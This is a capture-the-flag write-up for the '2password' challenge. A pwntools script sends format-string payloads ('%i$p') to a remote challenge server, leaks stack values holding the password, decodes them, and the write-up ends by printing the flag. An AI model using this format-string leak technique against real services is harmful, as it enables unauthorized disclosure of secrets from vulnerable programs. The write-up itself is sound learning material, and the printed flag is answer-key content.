# 2password

Solved by: @Father Jamil
### Question:
2Password > 1Password
`nc chall.lac.tf 31142`
### Solution:
```python
from pwn import *

elf = context.binary = ELF('./chall', checksec=False)
context.log_level = 'debug'

for i in range(1, 30):
    # io = process()
    io = remote('chall.lac.tf', 31142)
    payload = f'%{i}$p'
    io.sendlineafter(b'Enter username: ', payload)
    io.sendlineafter(b'Enter password1: ', '1')
    io.sendlineafter(b'Enter password2: ', '1')
    io.recvuntil(b'Incorrect password for user ')

    response = io.recvline().decode()

    if response.startswith("0x"):
        try:
            response_no_0x = response[2:]
            response_unhexed = unhex(response_no_0x)

            response_big_indian = response_unhexed[::-1]
            print(f'{i}: Big-Indian: {response_big_indian}')
        except ValueError:
            print(f'{i}: Inalid hex: {response}')
    else:
        print(f"{i}: Not a hex leak: {response}")

    io.close()

# Flag found at 6th, 7th, and 8th argument
```

**Flag:**`lactf{hunter2_cfc0xz68}`
